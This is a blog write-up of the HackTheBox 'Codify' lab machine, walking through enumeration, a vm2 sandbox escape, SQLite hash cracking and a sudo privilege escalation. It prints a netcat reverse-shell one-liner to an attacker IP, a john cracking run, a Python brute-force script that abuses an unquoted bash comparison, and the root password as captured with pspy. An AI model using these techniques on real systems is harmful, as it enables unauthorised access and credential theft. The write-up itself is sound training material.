---
layout: post
title: HackTheBox Codify
date: 2023-11-04
tags: [HackTheBox, Linux]
---

# Machine Synopsis

Codify is an easy Linux machine that features a web application that allows users to test `Node.js` code. The application uses a vulnerable `vm2` library, which is leveraged to gain remote code execution. Enumerating the target reveals a `SQLite` database containing a hash which, once cracked, yields `SSH` access to the box. Finally, a vulnerable `Bash` script can be run with elevated privileges to reveal the `root` user&amp;#039;s password, leading to privileged access to the machine. ([Source](https://app.hackthebox.com/machines/Codify/information))

# Enumeration

```bash
$ nmap -sV -sC 10.10.11.239
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.11.239
Host is up (0.0052s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://codify.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.71 seconds
```

Here is the webpage.

![website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Codify/website.png?raw=true)

Here is the `About us` webpage.

![about_us_webpage](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Codify/about_us_webpage.png?raw=true)

Clicking on `vm2` link on the webpage brings us to this [GitHub release page](https://github.com/patriksimek/vm2/releases/tag/3.9.16).

Here is the `Editor` webpage.

![editor_webpage](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Codify/editor_webpage.png?raw=true)

# Exploitation

Searching for `vm2` library exploit on Google resulted in this [GitHub Gist code](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac).

![vm2_exploit](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Codify/vm2_exploit.png?raw=true)

Simply get a shell by executing a reverse shell command and running a netcat listener.

```javascript
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.19 9999 >/tmp/f
```

```bash
$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.239] 41778
/bin/sh: 0: can't access tty; job control turned off
$ pwd
/home/svc
$ cd /home
$ ls
joshua
svc
```

It seems like we need to find a way to `joshua` user. 

Found a `ticket.db` file after enumerating around.

```bash
$ pwd
/var/www/contact
$ ls
index.js
package.json
package-lock.json
templates
tickets.db
$ cat tickets.db
�T5��T�format 3@  .WJ
       otableticketsticketsCREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)��	tableusersusersCREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
��G�joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
��
����ua  users
             ickets
r]r�h%%�Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open� ;�wTom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open$
```

Crack the credentials found using `john`.

```bash
$ cat joshua_hash
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
$ john joshua_hash --wordlist=/usr/share/wordlists/rockyou.txt
...
spongebob1       (?)     
```

Cracked the password `spongebob1` for `joshua`.

```bash
ssh joshua@10.10.11.239
...
joshua@10.10.11.239's password: spongebob1
...
joshua@codify:~$ 
```



# Privilege Escalation

```bash
joshua@codify:~$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
joshua@codify:~$ id
uid=1000(joshua) gid=1000(joshua) groups=1000(joshua)
```



```bash
joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

There are two potential issues in this script:

-   Bash has [vulnerabilties](https://mywiki.wooledge.org/BashPitfalls#A.5B_.24foo_.3D_.22bar.22_.5D) when doing comparisons of strings where a variable is expanded not in “”.

```sh
if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi
```

-   When executing `mysql` and `mysqldump` commands, the password is provided via the command line, using the password stored in a file rather than one entered by the user. If the `/proc` directory is not mounted with `hidepid`, any user monitoring the process list can potentially view the password during its execution.

```sh
databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done
```

There is some interesting output after using a wildcard `*` when we are requested for a password.  

```bash
joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root: password
Password confirmation failed!
joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root: *
Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
Backing up database: sys
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
All databases backed up successfully!
Changing the permissions
Done!
```

Craft a brute force python script that performs a check on all characters by inserting a wildcard behind the character being checked.

```bash
joshua@codify:~$ cat brute.py
import string
import subprocess
all = list(string.ascii_letters + string.digits)
password = ""
found = False

while not found:
    for character in all:
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        if "Password confirmed!" in output:
            password += character
            print(password)
            break
    else:
        found = True
joshua@codify:~$ python3 brute.py 
k
kl
klj
kljh
kljh1
kljh12
kljh12k
kljh12k3
kljh12k3j
kljh12k3jh
kljh12k3jha
kljh12k3jhas
kljh12k3jhask
kljh12k3jhaskj
kljh12k3jhaskjh
kljh12k3jhaskjh1
kljh12k3jhaskjh12
kljh12k3jhaskjh12k
kljh12k3jhaskjh12kj
kljh12k3jhaskjh12kjh
kljh12k3jhaskjh12kjh3
```

The root password is `kljh12k3jhaskjh12kjh3`.

```bash
joshua@codify:~$ su root
Password: 
root@codify:/home/joshua# 
```

# Alternative Privilege Escalation

Use pspy to monitor the processes when attempting to enter the password `*` while executing `/opt/scripts/mysql-backup.sh` file.

```bash
joshua@codify:/dev/shm$ ./pspy64
...
- execute /opt/scripts/mysql-backup.sh and enter * as password value -
...
CMD: UID=0     PID=3758   | /usr/bin/mysql -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 -e SHOW DATABASES; 
```

